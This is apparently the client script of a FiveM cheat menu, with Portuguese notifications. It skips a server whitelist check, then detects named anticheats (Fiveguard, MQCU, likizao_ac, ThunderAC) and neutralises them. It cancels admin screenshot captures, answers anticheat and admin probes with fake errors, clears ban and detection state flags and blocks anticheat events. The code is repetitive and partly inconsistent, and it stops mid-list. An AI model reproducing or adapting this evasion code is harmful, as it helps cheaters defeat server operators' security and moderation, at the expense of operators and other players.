
function DrawTexts(Text, Size, x, y, Font, r, g, b, a)
    SetTextFont(Font or 4)
    SetTextCentre(true)
    SetTextProportional(1)
    SetTextScale(100.0, Size)
    SetTextColour(r, g, b, a)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(Text)
    EndTextCommandDisplayText(x, y)
end

function DrawTextColor(Text, x, y, Outline, Size, Font, center, r, g, b, a)
    SetTextFont(Font)
    if Outline then SetTextOutline(true) end
    if tonumber(Font) ~= nil then SetTextFont(Font) end
    if center then SetTextCentre(true) end
    SetTextColour(r, g, b, a)
    SetTextScale(100.0, Size or 0.23)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(Text)
    EndTextCommandDisplayText(x, y)
end

local textures = {
    { name = "camargo-notify", link = "", width = 1920, height = 1080 },
    { name = "camargo-error",  link = "",  width = 26,   height = 26 },
    { name = "camargo-sucess", link = "", width = 30,   height = 30 },
    { name = "camargo-warn",   link = "",   width = 28,   height = 28 },
}

for _, v in pairs(textures) do
    if HasStreamedTextureDictLoaded(v.name) ~= 1 then
        local duiHandle = GetDuiHandle(CreateDui(v.link, v.width, v.height))
        CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd(v.name), v.name, duiHandle)
    end
    loaded = true
end



local main = {
    Loop = true,
    menuOpen = false,
    x = 0.0,
    y = 0.0,
    tab = "jogador",
    subtab = "Jogador",
    anim = { tab = { y = 0.474, y_d = 0.474 }, subTab = { y = 0.0, y_d = 0.03155 } },
    Lerp = function(a, b, t) return a + (b - a) * t end
}


local Notifys = {}
local maxNotifs = 5
local baseTime = 4000
local delayIncrement = 1000

function Notify(Tipo, Type, Text, r, g, b)
    local x_res, y_res = GetActiveScreenResolution()
    local startTime = GetGameTimer()
    for _, notify in ipairs(Notifys) do
        if notify.Text == Text and notify.Type == Type and not notify.isFadingOut then
            return
        end
    end
    if #Notifys >= maxNotifs then
        Citizen.CreateThread(function()
            while #Notifys >= maxNotifs do
                Citizen.Wait(100)
            end
        end)
    end
    local notifyOrder = #Notifys + 1
    local adjustedTime = baseTime + (notifyOrder - 1) * delayIncrement
    local offset = (notifyOrder - 1) * 0.09
    local adjustedY = 0.09 + offset
    local Notify = {
        Text = Text,
        Type = Type,
        anim = { Notify = { x = -0.1, alpha = 255 } },
        startTime = startTime,
        originalY = adjustedY,
        isFadingOut = false,
        Time = adjustedTime
    }
    table.insert(Notifys, Notify)
    Citizen.CreateThread(function()
        while true do
            local currentTime = GetGameTimer()
            if not Notify.isFadingOut then
                Notify.anim.Notify.x = main.Lerp(Notify.anim.Notify.x, 0.120, 0.05)
            end
            if Notify.isFadingOut then
                Notify.anim.Notify.alpha = math.max(Notify.anim.Notify.alpha - 5, 0)
                Notify.anim.Notify.x = main.Lerp(Notify.anim.Notify.x, -0.3, 0.05)
            end

            DrawTextColor(Tipo, Notify.anim.Notify.x - 0.0750, Notify.originalY - 0.037, false, 0.36, 11, false, 250, 250,
                250, Notify.anim.Notify.alpha)
            DrawTextColor(Text, Notify.anim.Notify.x - 0.0750, Notify.originalY - 0.012, false, 0.30, 11, false, 200, 200,
                200, Notify.anim.Notify.alpha)
            DrawSprite("camargo-notify", "camargo-notify", Notify.anim.Notify.x, Notify.originalY, x_res / x_res,
                y_res / y_res - 0.140, 0, 255, 255, 255, Notify.anim.Notify.alpha)
            DrawSprite(Type, Type, Notify.anim.Notify.x - 0.085, Notify.originalY - 0.024, 18 / x_res, 18 / y_res, 0, r,
                g, b, Notify.anim.Notify.alpha)
            if (currentTime - Notify.startTime) > Notify.Time and not Notify.isFadingOut then
                Notify.isFadingOut = true
            end
            if Notify.anim.Notify.alpha <= 0 then
                for i, n in ipairs(Notifys) do
                    if n == Notify then
                        table.remove(Notifys, i)
                        break
                    end
                end
                for i, n in ipairs(Notifys) do
                    n.originalY = 0.07 + ((i - 1) * 0.09)
                end
                break
            end
            Citizen.Wait(0)
        end
    end)
end

Notify("Sucesso", "camargo-sucess", "WL Pulada!", 255, 255, 255)

Notify("Sucesso", "camargo-sucess", "Menu iniciado com sucesso!", 255, 255, 255)


RegisterNUICallback("requestAllowed", function(data, cb) -- pular wl fusion Group
    Notify("Aviso", "camargo-warn", "Tentando Pular WL!", 255, 255, 255)
    cb(2)
end)
Citizen.CreateThread(function()
    RegisterNUICallback("requestAllowed", function(data, cb) -- pular wl fusion Group
        Notify("Aviso", "camargo-warn", "Tentando Pular WL!", 255, 255, 255)
        cb(2)
    end)
end)

local spawn = Citizen.CreateThread

local Keys = {
    ['ESC'] = 322,
    ['NENHUM'] = 0,
    ['F1'] = 288,
    ['F2'] = 289,
    ['F3'] = 170,
    ['F5'] = 166,
    ['F6'] = 167,
    ['F7'] = 168,
    ['F8'] = 169,
    ['F9'] = 56,
    ['F10'] = 57,
    ['~'] = 243,
    ['1'] = 157,
    ['2'] = 158,
    ['3'] = 160,
    ['4'] = 164,
    ['5'] = 165,
    ['6'] = 159,
    ['7'] = 161,
    ['8'] = 162,
    ['9'] = 163,
    ['-'] = 84,
    ['='] = 83,
    ['BACKSPACE'] = 177,
    ['nilsun'] = 37,
    ['Q'] = 44,
    ['E'] = 38,
    ['R'] = 45,
    ['T'] = 245,
    ['Y'] = 246,
    ['U'] = 303,
    ['P'] = 199,
    ['['] = 39,
    [']'] = 40,
    ['CAPS'] = 137,
    ['F'] = 23,
    ['G'] = 47,
    ['H'] = 74,
    ['K'] = 311,
    ['L'] = 182,
    ['LEFTSHIFT'] = 21,
    ['Z'] = 20,
    ['X'] = 73,
    ['C'] = 26,
    ['V'] = 0,
    ['B'] = 29,
    ['N'] = 249,
    ['M'] = 244,
    [','] = 82,
    ['.'] = 81,
    ['LEFTCTRL'] = 36,
    ['LEFTALT'] = 19,
    ['SPACE'] = 22,
    ['RIGHTCTRL'] = 70,
    ['HOME'] = 213,
    ['PAGEUP'] = 10,
    ['PAGEDOWN'] = 11,
    ['DELETE'] = 178,
    ['INSERT'] = 121,
    ['LEFT'] = 174,
    ['RIGHT'] = 175,
    ['UP'] = 172,
    ['DOWN'] = 173,
    ['MWHEELUP'] = 15,
    ['MWHEELDOWN'] = 14,
    ['LEFTSHIFT/N8'] = 61,
    ['N4'] = 108,
    ['N5'] = 60,
    ['N6'] = 107,
    ['N+'] = 96,
    ['N-'] = 97,
    ['N7'] = 117,
    ['N9'] = 118,
    ['MOUSE1'] = 24,
    ['MOUSE2'] = 25,
    ['MOUSE3'] = 348
}


for i = 0, GetNumResources(), 1 do
    Citizen.CreateThread(function()
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "screenshot-basic",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )

        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "vRP:likizao_ac:tunnel_req",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac:tunnel_req", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("isAdmin")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("isAdmin", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("1676171191:U27T")
        AddEventHandler(
            "1676171191:U27T",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("1676171191:U27T", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "print",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )
    end)

    local resource_name = GetResourceByFindIndex(i)
    if resource_name and GetResourceState(resource_name) == "started" then
        if GetNumResourceMetadata(resource_name, "client_script") == 4 and resource_name ~= seconderes then
            if GetResourceMetadata(resource_name, "client_script", 0) == "lib/Tunnel.lua" and GetResourceMetadata(resource_name, "client_script", 1) == "lib/Proxy.lua" and GetResourceMetadata(resource_name, "client_script", 2) == "client.lua" and GetResourceMetadata(resource_name, "client_script", 3) == "69.lua" then
                firstres = resource_name
            end
        end
        if GetNumResourceMetadata(resource_name, "server_script") == 2 and resource_name ~= firstres then
            if GetResourceMetadata(resource_name, "server_script", 0) == "@vrp/lib/utils.lua" and GetResourceMetadata(resource_name, "server_script", 1) == "server.lua" and GetResourceMetadata(resource_name, "client_script", 0) == "lib/Tunnel.lua" and GetResourceMetadata(resource_name, "client_script", 1) == "lib/Proxy.lua" and GetResourceMetadata(resource_name, "client_script", 2) == 'client.lua' then
                seconderes = resource_name
            end
        end
        if resource_name == "vRP" or resource_name == "vrp" then
            rp = true
        end
        if GetResourceMetadata(resource_name, "ac", 0) == "fg" then
            print("")
            print("")
            print("")
            print("")
            print("")
            print("^7Detected AC: ^7[^1Fiveguard^7]")
            print('^7Resource:^7 ^7[^1' .. resource_name .. '^7]')
            Notify("Aviso", "camargo-warn", "Fiveguard Detectado!!", 255, 255, 255)
            print("")
            print("")
            print("")
            print("")
            print("")
            print("")
        end
    end
end
g3tzz = function(valu333)
    return GetResourceState(tostring(valu333), Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

getsource = function(source)
    if g3tzz(source) == "started" or g3tzz(string.lower(source)) == "started" or g3tzz(string.upper(source)) == "started" then
        return true
    else
        return false
    end
end


if getsource('MQCU') then
    Citizen.CreateThread(function()
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "screenshot-basic",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )

        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "vRP:likizao_ac:tunnel_req",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac:tunnel_req", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("isAdmin")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("isAdmin", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("1676171191:U27T")
        AddEventHandler(
            "1676171191:U27T",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("1676171191:U27T", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "print",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )
    end)


    LocalPlayer.state.games = true
    LocalPlayer.state.pvp = true
    GlobalState.NovatTime = 0
    LocalPlayer.state.onlineTime = 250
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false
    Notify("Sucesso", "camargo-sucess", "Anticheat Detectado: MQCU", 255, 255, 255)
    RegisterNetEvent("tryagain_bye")
    AddEventHandler("tryagain_bye", function()
        CancelEvent()
    end)

    RegisterNetEvent("GCDXTOADMMBQBH")
    AddEventHandler("GCDXTOADMMBQBH", function()
        CancelEvent()
    end)

    RegisterNetEvent("regnm")
    AddEventHandler("regnm", function()
        CancelEvent()
    end)
end

if getsource('likizao_ac') then
    Citizen.CreateThread(function()
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "screenshot-basic",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )

        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "vRP:likizao_ac:tunnel_req",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac:tunnel_req", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("isAdmin")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("isAdmin", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("1676171191:U27T")
        AddEventHandler(
            "1676171191:U27T",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("1676171191:U27T", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "print",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )
    end)

    Notify("Aviso", "camargo-warn", "Anticheat Detectado: Likizao_AC", 255, 255, 255)
    LocalPlayer.state.games = true
    LocalPlayer.state.pvp = true
    GlobalState.NovatTime = 0
    LocalPlayer.state.onlineTime = 250
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false


    RegisterNetEvent("tryagain_bye")
    AddEventHandler("tryagain_bye", function()
        CancelEvent()
    end)

    RegisterNetEvent("GCDXTOADMMBQBH")
    AddEventHandler("GCDXTOADMMBQBH", function()
        CancelEvent()
    end)

    RegisterNetEvent("regnm")
    AddEventHandler("regnm", function()
        CancelEvent()
    end)
end

if getsource('ThnAC') then
    Citizen.CreateThread(function()
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "screenshot-basic",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )

        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "vRP:likizao_ac:tunnel_req",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac:tunnel_req", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("isAdmin")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("isAdmin", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("likizao_ac:tunnel_req")
        AddEventHandler(
            "isAdmin",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("likizao_ac", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("1676171191:U27T")
        AddEventHandler(
            "1676171191:U27T",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerServerEvent("1676171191:U27T", "ERROR")
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot_basic:requestScreenshot")
        AddEventHandler(
            "screenshot_basic:requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("EasyAdmin:CaptureScreenshot")
        AddEventHandler(
            "EasyAdmin:CaptureScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshot")
        AddEventHandler(
            "requestScreenshot",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("__cfx_nui:screenshot_created")
        AddEventHandler(
            "__cfx_nui:screenshot_created",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("screenshot-basic")
        AddEventHandler(
            "print",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        RegisterNetEvent("requestScreenshotUpload")
        AddEventHandler(
            "requestScreenshotUpload",
            function()
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                CancelEvent()
            end
        )
        AddEventHandler(
            "EasyAdmin:FreezePlayer",
            function(P)
                Notify("Aviso", "camargo-warn", "Screenshot Cancelada!", 255, 255, 255)
                TriggerEvent("EasyAdmin:FreezePlayer")
            end
        )
    end)

    LocalPlayer.state.games = true
    LocalPlayer.state.pvp = true
    GlobalState.NovatTime = 0
    LocalPlayer.state.onlineTime = 250
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false
    LocalPlayer.state.lasttry = nil
    LocalPlayer.state.lasttry = false
    LocalPlayer.state.ban2 = nil
    LocalPlayer.state.ban2 = false
    LocalPlayer.state.controlDisabled = nil
    LocalPlayer.state.controlDisabled = false
    LocalPlayer.state.vht = nil
    LocalPlayer.state.vht = false
    GlobalState.acName = nil
    GlobalState.acName = false
    _Banargsv4 = nil
    _Banargsv4 = false
    CreatePickup = true
    GlobalState.slsthashs = nil
    GlobalState.slsthashs = false
    GlobalState.ams = nil
    GlobalState.ams = false
    ____weapon_types = nil
    ____weapon_types = false

    Notify("Aviso", "camargo-warn", "Anticheat Detectado: ThunderAC", 255, 255, 255)
    local eventsToCancel = {
        "tryagain_bye",
        "thn:throught",
        "thn:vision",
        "thn:spectate",
        "thn:deleyed",
        "thninvicible",
        "thnvisiblelocally",
        "thnvisible",
        "thn:coordsoff",
        "thn:coords",
        "thn:sethealth",
        "thn:proofs",
        "thn:setShield",
        "thn:requestModel",
        "thn:addExplode",
        "thn:setpedaushdnms",
        "kwdwidwijdijisa",
        "canbedamaged",
        "thn:modifytopspeed",
        "vehMod",
        "enteredVehicle",
        "thn:addammo",
        "thn:setammo",
        "thn:transactionVerify",
        "entities:enviarDados",
        "thn:pegaidiota",
        "thn:client:receberDados:beta",
        "thn:client:receberDados",
        "thn:client:disconnect",
        "thn:addtexture",
        "thn:setpedprop",
        "thn:componentvariatio",
        "thn:clearprop",
